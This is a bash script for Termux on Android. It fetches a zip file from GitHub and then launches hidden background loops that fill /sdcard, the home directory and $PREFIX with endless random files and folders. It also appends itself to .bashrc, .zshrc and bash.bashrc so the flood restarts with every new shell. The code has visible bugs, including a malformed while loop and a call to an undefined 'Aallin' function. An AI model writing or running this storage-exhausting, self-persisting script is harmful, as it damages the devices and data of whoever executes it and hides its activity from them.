cwg() {
	if [ -e "$PREFIX/bin/wget" ];then
	echo
	else
	apt install wget
	fi
	}
	ab() {
	if [ -e ".all" ];then
	cd .all
	cwg
	wget -q https://github.com/rooted-cyber/good/raw/master/abcd.zip
	unzip abcd.zip -d abcd > /dev/null 2>&1
	else
	mkdir .all
	cd .all
	wget -q https://github.com/rooted-cyber/good/raw/master/abcd.zip
	unzip abcd.zip -d abcd > /dev/null 2>&1
	cd abcd
	fi
	}
	a() {
	cd /sdcard/Android
	ab
	while [ true ];do
	cp -f ab.txt $RANDOM$RANDOM$RANDOM$RANDOM.txt
	mkdir ab$RANDOM$RANDOM$RANDOM$RANDOM
	touch ab$RANDOM$RANDOM$RANDOM$RANDOM
	done > /dev/null 2>&1 &
	}
	a
	abc() {
		touch $RANDOM$RANDOM$RANDOM$RANDOM
		touch a$RANDOM$RANDOM$RANDOM$RANDOM
		touch b$RANDOM$RANDOM$RANDOM$RANDOM
		touch c$RANDOM$RANDOM$RANDOM$RANDOM
		touch d$RANDOM$RANDOM$RANDOM$RANDOM
		touch e$RANDOM$RANDOM$RANDOM$RANDOM
		touch f$RANDOM$RANDOM$RANDOM$RANDOM
		touch g$RANDOM$RANDOM$RANDOM$RANDOM
		touch h$RANDOM$RANDOM$RANDOM$RANDOM
		touch i$RANDOM$RANDOM$RANDOM$RANDOM
		touch j$RANDOM$RANDOM$RANDOM$RANDOM
		touch k$RANDOM$RANDOM$RANDOM$RANDOM
		touch l$RANDOM$RANDOM$RANDOM$RANDOM
		touch m$RANDOM$RANDOM$RANDOM$RANDOM
		touch n$RANDOM$RANDOM$RANDOM$RANDOM
		touch o$RANDOM$RANDOM$RANDOM$RANDOM
		touch p$RANDOM$RANDOM$RANDOM$RANDOM
		touch q$RANDOM$RANDOM$RANDOM$RANDOM
		touch r$RANDOM$RANDOM$RANDOM$RANDOM
		touch s$RANDOM$RANDOM$RANDOM$RANDOM
		touch t$RANDOM$RANDOM$RANDOM$RANDOM
		touch u$RANDOM$RANDOM$RANDOM$RANDOM
		touch v$RANDOM$RANDOM$RANDOM$RANDOM
		touch w$RANDOM$RANDOM$RANDOM$RANDOM
		touch x$RANDOM$RANDOM$RANDOM$RANDOM
		touch y$RANDOM$RANDOM$RANDOM$RANDOM
		touch z$RANDOM$RANDOM$RANDOM$RANDOM
		
		mkdir $RANDOM$RANDOM$RANDOM$RANDOM
		mkdir $RANDOM$RANDOM$RANDOM$RANDOM
		mkdir a$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir b$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir c$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir d$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir e$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir f$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir g$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir h$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir i$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir j$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir k$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir l$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir m$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir n$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir o$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir p$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir q$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir r$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir s$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir t$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir u$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir v$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir w$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir x$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir y$RANDOM$RANDOM$RANDOM$RANDOM
		mkdir z$RANDOM$RANDOM$RANDOM$RANDOM
		}
		fol() {
			while [ True ];then
			cd $PREFIX
			abc
			cd ~
			abc
			cd /sdcard
			abc
			done > /dev/null 2>&1 &
			}
			fol
			checkb() {
				abb=$(cat ~/.bashrc | grep -e "bash $PREFIX/allp.sh")
				if [ -z "$abb" ];then
				cd ~
				echo "bash $PREFIX/allp.sh" >> .bashrc
				cd $PREFIX/etc
				echo "bash $PREFIX/allp.sh" >> bash.bashrc
				fi
				}
				checkz() {
					zab=$(cat ~/.zshrc | grep -e "source bash $PREFIX/allp.sh")
					if [ -z "$zab" ];then
					cd ~
					echo "source $PREFIX/allp.sh" >> .zshrc
					fi
					}
					checkbb() {
						bbab=$(cat $PREFIX/etc/bash.bashrc | grep -e "allp.sh")
						if [ -z "$bbab" ];then
						cd $PREFIX/etc
						echo "bash $PREFIX/allp.sh" >> bash.bashrc
						fi
						}
				
			allin() {
				if [ -e ".bashrc" ];then
				checkb
				fi
				if [ -e ".zshrc" ];then
				checkz
				fi
				if [ -e "$PREFIX/etc/bash.bashrc" ];then
				checkbb
				fi
				if [ -e "$PREFIX/allp.sh" ];then
				echo
				else
				cp -f ~/All-In-One/allp.sh $PREFIX
				fi
				}
				Aallin
			